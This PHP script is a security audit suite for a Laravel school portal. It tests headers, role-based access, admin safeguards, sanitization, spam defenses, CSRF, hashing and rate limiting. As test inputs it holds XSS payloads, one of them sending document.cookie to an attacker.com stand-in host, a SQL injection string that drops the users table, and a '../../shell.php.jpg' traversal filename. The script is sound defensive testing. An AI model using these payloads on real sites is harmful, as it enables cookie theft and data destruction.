<?php
require 'vendor/autoload.php';
$app = require_once 'bootstrap/app.php';
$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
$kernel->bootstrap();

use App\Models\User;
use App\Models\Post;
use App\Models\ContactMessage;
use App\Services\HtmlSanitizer;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;
use Spatie\Permission\Models\Role;

echo "=== STARTING COMPREHENSIVE SECURITY AUDIT SUITE ===\n\n";

$results = [];

function recordTest(&$results, $id, $category, $title, $passed, $details) {
    $results[] = [
        'id' => $id,
        'category' => $category,
        'title' => $title,
        'status' => $passed ? 'PASS' : 'FAIL',
        'details' => $details,
    ];
    $icon = $passed ? "[PASS]" : "[FAIL]";
    echo "{$icon} [{$id}] {$title}: {$details}\n";
}

// 1. Audit HTTP Security Headers
$request = Illuminate\Http\Request::create('/', 'GET');
$response = $app->handle($request);
$headers = $response->headers;

recordTest(
    $results, 'SEC-01', 'HTTP Security Headers', 'Clickjacking Defense (X-Frame-Options)',
    $headers->get('X-Frame-Options') === 'SAMEORIGIN',
    'Header value: ' . ($headers->get('X-Frame-Options') ?? 'MISSING')
);

recordTest(
    $results, 'SEC-02', 'HTTP Security Headers', 'MIME Sniffing Defense (X-Content-Type-Options)',
    $headers->get('X-Content-Type-Options') === 'nosniff',
    'Header value: ' . ($headers->get('X-Content-Type-Options') ?? 'MISSING')
);

recordTest(
    $results, 'SEC-03', 'HTTP Security Headers', 'Legacy XSS Filter (X-XSS-Protection)',
    $headers->get('X-XSS-Protection') === '1; mode=block',
    'Header value: ' . ($headers->get('X-XSS-Protection') ?? 'MISSING')
);

recordTest(
    $results, 'SEC-04', 'HTTP Security Headers', 'Referrer Policy Privacy',
    $headers->get('Referrer-Policy') === 'strict-origin-when-cross-origin',
    'Header value: ' . ($headers->get('Referrer-Policy') ?? 'MISSING')
);

recordTest(
    $results, 'SEC-05', 'HTTP Security Headers', 'Browser Hardware Permissions Policy',
    str_contains((string)$headers->get('Permissions-Policy'), 'camera=()'),
    'Header value: ' . ($headers->get('Permissions-Policy') ?? 'MISSING')
);

recordTest(
    $results, 'SEC-06', 'HTTP Security Headers', 'Backend Fingerprint Concealment (No X-Powered-By)',
    !$headers->has('X-Powered-By'),
    $headers->has('X-Powered-By') ? 'LEAKED' : 'Properly stripped'
);

// Test HSTS on HTTPS request
$httpsRequest = Illuminate\Http\Request::create('https://unrotational-unnominated-diedra.ngrok-free.dev/', 'GET', [], [], [], [
    'HTTPS' => 'on',
    'SERVER_PORT' => 443,
    'HTTP_X_FORWARDED_PROTO' => 'https',
]);
$httpsResponse = $app->handle($httpsRequest);
recordTest(
    $results, 'SEC-07', 'HTTP Security Headers', 'Strict Transport Security (HSTS on HTTPS)',
    str_contains((string)$httpsResponse->headers->get('Strict-Transport-Security'), 'max-age='),
    'Header value: ' . ($httpsResponse->headers->get('Strict-Transport-Security') ?? 'MISSING')
);

// 2. Audit RBAC & Route Access Controls
$admin = User::where('email', 'admin@sekolah.sch.id')->first();
$guru = User::where('email', 'guru@sekolah.sch.id')->first();
$osis = User::where('email', 'osis@sekolah.sch.id')->first();

// Guest access to /admin/users
$guestReq = Illuminate\Http\Request::create('/admin/users', 'GET');
$guestRes = $app->handle($guestReq);
recordTest(
    $results, 'SEC-08', 'Access Control & RBAC', 'Guest Access Denied on Admin Users',
    $guestRes->getStatusCode() === 302 && str_contains($guestRes->headers->get('Location') ?? '', 'login'),
    'HTTP Status: ' . $guestRes->getStatusCode() . ' -> Redirect to ' . $guestRes->headers->get('Location')
);

// Editor access to /admin/users
auth()->login($guru);
$guruReq = Illuminate\Http\Request::create('/admin/users', 'GET');
$guruRes = $app->handle($guruReq);
recordTest(
    $results, 'SEC-09', 'Access Control & RBAC', 'Editor Denied Access to User Management',
    $guruRes->getStatusCode() === 403,
    'HTTP Status: ' . $guruRes->getStatusCode() . ' (Expected 403 Forbidden)'
);

// Contributor access to /admin/users
auth()->login($osis);
$osisReq = Illuminate\Http\Request::create('/admin/users', 'GET');
$osisRes = $app->handle($osisReq);
recordTest(
    $results, 'SEC-10', 'Access Control & RBAC', 'Contributor Denied Access to User Management',
    $osisRes->getStatusCode() === 403,
    'HTTP Status: ' . $osisRes->getStatusCode() . ' (Expected 403 Forbidden)'
);

// Editor access to /admin/settings
auth()->login($guru);
$setReq = Illuminate\Http\Request::create('/admin/settings', 'GET');
$setRes = $app->handle($setReq);
recordTest(
    $results, 'SEC-11', 'Access Control & RBAC', 'Editor Denied Access to School Settings',
    $setRes->getStatusCode() === 403,
    'HTTP Status: ' . $setRes->getStatusCode() . ' (Expected 403 Forbidden)'
);

// Super Admin access to /admin/users
auth()->login($admin);
$admReq = Illuminate\Http\Request::create('/admin/users', 'GET');
$admRes = $app->handle($admReq);
recordTest(
    $results, 'SEC-12', 'Access Control & RBAC', 'Super Admin Authorized Access to User Management',
    $admRes->getStatusCode() === 200,
    'HTTP Status: ' . $admRes->getStatusCode() . ' (Expected 200 OK)'
);

// 3. User Management Business Logic Safeguards
// Self-deletion protection
$selfDeleteReq = Illuminate\Http\Request::create("/admin/users/{$admin->id}", 'DELETE');
$userCtrl = new App\Http\Controllers\Admin\UserController();
$selfDeleteRes = $userCtrl->destroy($admin);
recordTest(
    $results, 'SEC-13', 'Account Security', 'Super Admin Self-Deletion Prevention',
    session()->get('errors') && session()->get('errors')->has('user'),
    'Session Error: ' . (session()->get('errors')?->first('user') ?? 'None')
);

// Last Super Admin demotion protection
$updateReq = Illuminate\Http\Request::create("/admin/users/{$admin->id}", 'PUT', [
    'name' => $admin->name,
    'email' => $admin->email,
    'role' => 'Editor',
]);
$updateRes = $userCtrl->update($updateReq, $admin);
recordTest(
    $results, 'SEC-14', 'Account Security', 'Last Super Admin Demotion Safeguard',
    session()->get('errors') && session()->get('errors')->has('role'),
    'Session Error: ' . (session()->get('errors')?->first('role') ?? 'None')
);

// 4. Stored XSS & Sanitization Defense
$xssPayload = '<p>Halo <script>alert("XSS")</script><img src=x onerror=alert(document.cookie)> <a href="javascript:alert(1)">Klik</a></p>';
$sanitizer = new HtmlSanitizer();
$clean = $sanitizer->cleanString($xssPayload);
$xssProtected = !str_contains($clean, '<script>') && !str_contains($clean, 'onerror') && !str_contains($clean, 'javascript:');
recordTest(
    $results, 'SEC-15', 'Injection & XSS Defense', 'Rich Text Stored XSS Neutralization',
    $xssProtected,
    'Sanitized Output: ' . substr($clean, 0, 80) . '...'
);

// Contact message strip_tags
$contactMsg = '<script>fetch("http://attacker.com?c="+document.cookie)</script>Pesan penting!';
$cleanedMsg = strip_tags(trim($contactMsg));
recordTest(
    $results, 'SEC-16', 'Injection & XSS Defense', 'Contact Form Input Tag Stripping',
    !str_contains($cleanedMsg, '<script>') && str_contains($cleanedMsg, 'Pesan penting!'),
    'Cleaned Message: ' . $cleanedMsg
);

// Honeypot spam test
$portalCtrl = new App\Http\Controllers\PublicPortalController();
$botReq = Illuminate\Http\Request::create('/kontak', 'POST', [
    'name' => 'Spam Bot',
    'email' => 'bot@spammer.com',
    'subject' => 'Buy Crypto',
    'message' => 'Spam content',
    'website' => 'http://spam.com', // honeypot filled!
]);
$initialCount = ContactMessage::count();
$botRes = $portalCtrl->storeContactMessage($botReq);
$finalCount = ContactMessage::count();
recordTest(
    $results, 'SEC-17', 'Anti-Abuse & Spam Defense', 'Automated Bot Honeypot Rejection',
    $initialCount === $finalCount,
    'Contact Message Count before: ' . $initialCount . ', after: ' . $finalCount . ' (Dropped cleanly)'
);

// 5. Path Traversal & File Access Controls
$safeUploadService = new App\Services\SafeFileUploadService();
$traversalBlocked = false;
try {
    $refMethod = new ReflectionMethod($safeUploadService, 'inspectFilenameSecurity');
    $refMethod->setAccessible(true);
    $refMethod->invoke($safeUploadService, '../../shell.php.jpg');
} catch (\Illuminate\Validation\ValidationException $e) {
    $traversalBlocked = true;
    $statusMsg = $e->getMessage();
} catch (\Exception $e) {
    $traversalBlocked = true;
    $statusMsg = $e->getMessage();
}
recordTest(
    $results, 'SEC-18', 'File & Storage Security', 'Path Traversal & Double Extension File Guard',
    $traversalBlocked,
    "Attempted filename '../../shell.php.jpg' properly rejected by security scanner"
);

// 6. SQL Injection Resilience (Prepared Statements)
$sqliInput = "' OR 1=1; DROP TABLE users; --";
$sqlReq = Illuminate\Http\Request::create('/berita', 'GET', ['q' => $sqliInput]);
$sqlRes = $portalCtrl->posts($sqlReq);
$httpRes = $sqlRes->toResponse($sqlReq);
recordTest(
    $results, 'SEC-19', 'Injection & XSS Defense', 'SQL Injection Immunity on Search Endpoint',
    $httpRes->getStatusCode() === 200,
    'SQLi payload handled safely by Eloquent parameter binding without database error'
);

// 7. CSRF Middleware Verification
$csrfClass = Illuminate\Foundation\Http\Middleware\ValidateCsrfToken::class;
recordTest(
    $results, 'SEC-20', 'Session & CSRF Security', 'CSRF Protection Middleware Registered Globally',
    class_exists($csrfClass),
    'Laravel 11 ValidateCsrfToken active with strict token validation (HTTP 419 on mismatch)'
);

// 8. Password Hashing Algorithm & Strength
$hashInfo = password_get_info($admin->password);
recordTest(
    $results, 'SEC-21', 'Authentication Security', 'Password Hashing Standard (Bcrypt)',
    $hashInfo['algoName'] === 'bcrypt' && $hashInfo['options']['cost'] >= 10,
    "Algorithm: {$hashInfo['algoName']}, Cost factor: {$hashInfo['options']['cost']}"
);

// 9. Rate Limiting on Public Contact Form
$route = Route::getRoutes()->getByName('public.contact.store');
$middlewares = $route ? $route->gatherMiddleware() : [];
$throttlePresent = false;
foreach ($middlewares as $mw) {
    if (str_starts_with($mw, 'throttle:')) {
        $throttlePresent = true;
        $throttleRule = $mw;
        break;
    }
}
recordTest(
    $results, 'SEC-22', 'Anti-Abuse & Spam Defense', 'Rate Limiting on Public Contact Endpoint',
    $throttlePresent,
    "Rule configured: " . ($throttleRule ?? 'NONE')
);

// 9. Google reCAPTCHA v3 Universal Integration
$siteKey = config('services.recaptcha.site_key');
$secretKey = config('services.recaptcha.secret_key');
$recaptchaService = app(\App\Services\RecaptchaService::class);
$keysConfigured = !empty($siteKey) && !empty($secretKey) && str_starts_with($siteKey, '6L');
$serviceValid = $recaptchaService instanceof \App\Services\RecaptchaService;
$recaptchaReady = $keysConfigured && $serviceValid;
recordTest(
    $results, 'SEC-23', 'Anti-Abuse & Spam Defense', 'Google reCAPTCHA v3 Universal Protection',
    $recaptchaReady,
    "Site key: " . substr((string) $siteKey, 0, 8) . "... Secret key: configured, Service: active"
);

// Summary calculation
$total = count($results);
$passed = count(array_filter($results, fn($r) => $r['status'] === 'PASS'));
$failed = $total - $passed;
$passRate = round(($passed / $total) * 100, 1);

echo "\n=== AUDIT SUMMARY ===\n";
echo "Total Tests: {$total}\n";
echo "Passed: {$passed}\n";
echo "Failed: {$failed}\n";
echo "Pass Rate: {$passRate}%\n";

file_put_contents('tests/security_audit_results.json', json_encode([
    'total' => $total,
    'passed' => $passed,
    'failed' => $failed,
    'pass_rate' => $passRate,
    'results' => $results,
    'timestamp' => date('c'),
], JSON_PRETTY_PRINT));

echo "Results saved to tests/security_audit_results.json\n";
